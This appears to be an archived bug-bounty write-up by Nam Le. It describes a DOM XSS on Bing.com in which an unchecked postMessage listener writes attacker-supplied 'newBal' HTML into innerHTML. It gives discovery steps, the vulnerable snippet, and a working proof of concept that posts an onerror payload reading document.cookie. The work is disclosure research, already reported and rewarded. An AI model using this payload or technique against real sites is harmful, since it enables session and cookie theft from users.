---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-27_how-i-found-dom-xss-via-postmessage-on-bingcom-microsoft-bug-bounty.md
original_filename: 2024-06-27_how-i-found-dom-xss-via-postmessage-on-bingcom-microsoft-bug-bounty.md
title: How I found DOM XSS via postMessage on Bing.com - Microsoft Bug Bounty
category: blogs
detected_topics:
- xss
- command-injection
tags:
- imported
- blogs
- xss
- command-injection
language: en
raw_sha256: c334d68cb67ed85041ba8472ca082d53d5f90675524d4d4504d5171f61e1bf4b
text_sha256: 0c2b28390b79dc2fac98222ea271a1c8a67dfcb8919cbf64be21085b91074db1
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# How I found DOM XSS via postMessage on Bing.com - Microsoft Bug Bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-27_how-i-found-dom-xss-via-postmessage-on-bingcom-microsoft-bug-bounty.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `c334d68cb67ed85041ba8472ca082d53d5f90675524d4d4504d5171f61e1bf4b`
- Text SHA256: `0c2b28390b79dc2fac98222ea271a1c8a67dfcb8919cbf64be21085b91074db1`


## Content

---
title: "How I found DOM XSS via postMessage on Bing.com - Microsoft Bug Bounty"
page_title: "How I found DOM XSS via postMessage on Bing.com - Microsoft Bug Bounty | Nam Le"
url: "https://namcoder.com/blog/how-i-found-dom-xss-on-bingcom-microsoft-bug-bounty-write-up/"
final_url: "https://namcoder.com/blog/how-i-found-dom-xss-on-bingcom-microsoft-bug-bounty-write-up/"
authors: ["Nam Le (@namcoder_com)"]
programs: ["Microsoft (Bing)"]
bugs: ["DOM XSS", "postMessage"]
publication_date: "2024-06-27"
added_date: "2024-07-15"
source: "pentester.land/writeups.json"
original_index: 219
---

# How I found DOM XSS via postMessage on Bing.com - Microsoft Bug Bounty

June 27, 2023 

![How I found DOM XSS via postMessage on Bing.com - Microsoft Bug Bounty](/img/msrc-xss-poc.png)

The website Bing.com has message event listeners. I found a feature that listens for postMessage with two arguments to update the User header bar with the user’s points badge. The following are the steps I took to find the DOM XSS.

  1. Open Google Chrome Inspect element, move to the _Source_ tab, then open the _Global Listeners_ from the right column.

  2. Check for all _message_ functions on the list.

  3. Look for places where you could execute the DOM XSS, such as with _.innerHTML_ , _window.location.href_ , or _window.location.open()_

In this case I found the function from the Javascript file URL <https://www.bing.com/rewardsapp/widgetassets/prod/medallion/latest/js/widget.js>

The code that look likes:
  
  
  addEventListener("message", (r=>{
  const i = r.data;
  if (!i || !Object.values(u).includes(i.action))
  return;
  const a = i.action
  ...
  ...
  document.querySelectorAll(d.MedallionPointsContainer).forEach((t=>{
  t && (t.classList.remove("balance-animation"),
  t.innerHTML = e.toString())
  }
  ))
  } 
  

=> t.innerHTML = e.toString() allow to insert HTML code!

My expolit code that look likes:
  
  
  <script>
  var w = window.open("https://www.bing.com/chat")
  setInterval(() => {
  w.postMessage( ({ action: "updatePoints" , newBal: '<img src=xx onerror=alert(document.cookie)>' }) ,"*") 
  }, 1000)
  </script>
  

Then I reported it to the Microsoft Bug Bounty program and received a reward.

**Video screenshot**

Happy hacking :)

[ #bug bounty ](/tags/bug-bounty)

Share
